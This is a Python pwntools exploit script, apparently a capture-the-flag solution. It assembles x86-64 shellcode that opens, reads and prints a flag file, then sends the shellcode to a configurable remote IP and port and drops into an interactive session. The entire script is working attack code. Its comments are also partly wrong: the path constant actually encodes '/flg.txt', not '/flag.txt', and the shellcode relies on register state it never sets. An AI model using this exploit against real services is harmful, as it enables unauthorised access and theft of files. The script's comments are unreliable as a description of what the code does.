"""
Frederick Pellerin
https://github.com/TheRealFREDP3D
https://x.com/TheRealFREDP3D
https://therealfred.ca
"""

from pwn import *

context.arch = 'amd64'

# Read /flag.txt on target host

# Optimized shellcode - 42 bytes
# Key optimizations:
# 1. xor rsi,rsi + push rsi instead of push 0 (removes null byte)
# 2. Use 1-byte registers (al, dil, dl) instead of full registers
# 3. Use xchg to swap registers instead of mov where possible
# 4. Remove exit syscall (not needed - server will crash anyway)

target_ip = "100.100.100.100" # <-------------- Change me!
target_port = 1337 # <------------ Change me!


shellcode = asm('''
    xor rsi, rsi
    push rsi                    ; push null terminator
    mov rdi, 0x7478742e676c662f ; '/flag.txt' (little-endian)
    push rdi
    mov al, 2                   ; open syscall (1 byte)
    mov rdi, rsp                ; filename pointer
    syscall

    mov dil, al                 ; fd from open (1 byte)
    mov al, 0                   ; read syscall (1 byte)
    push rsp
    pop rsi                     ; buffer on stack
    mov dl, 50                  ; read size (1 byte)
    syscall

    mov dl, al                  ; bytes read
    mov al, 1                   ; write syscall (1 byte)
    mov dil, 1                  ; stdout (1 byte)
    syscall
''')

print(f"Shellcode length: {len(shellcode)} bytes")
print(f"Shellcode hex: {shellcode.hex()}")

# Connect and exploit
p = remote(target_ip, target_port)
# p = process('./vuln')  # for local testing

p.recvuntil(b':')
p.sendline(shellcode)
p.interactive()
